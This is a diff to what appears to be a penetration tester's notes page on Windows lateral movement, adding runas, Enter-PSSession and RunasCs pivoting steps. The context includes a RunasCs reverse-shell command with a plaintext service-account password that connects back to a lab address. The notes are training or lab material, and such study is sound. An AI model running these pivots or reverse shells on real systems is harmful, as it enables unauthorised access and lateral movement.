@@ -14,6 +14,30 @@ tags:
 
 ### Running as another user
 
+#### Run as other user in your machine: runas 
+
+Run as another user. PIVOTING when you have access to a gui
+
+```
+runas /user:backupadmin cmd
+```
+
+#### Pivot to other machine: runas  + Enter-PSSession
+
+Step 1 in your machine:
+
+```powershell 
+runas /user:dev_user1 powershell.exe
+```
+
+Step 2 Then from that PowerShell session:
+
+```
+Enter-PSSession -ComputerName 172.16.5.139
+```
+
+#### Pivot to other machine: RunasCs.exe + Reverse shell
+
 Logged as user1 with evil-winrm we cannot run psexec or any other tool requiring to confirm a modal, since we only have terminal access. 
 
 However, the tester can use the binary RunasCs.exe from: https://github.com/antonioCoco/RunasCs/releases. Forked in the tester repo: https://github.com/amandaguglieri/RunasCs
@@ -35,6 +59,8 @@ Run a reverse shell:
 ```bash
 .\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.129:1234 
 ```
+
+
 
 
 ## Scenario 1
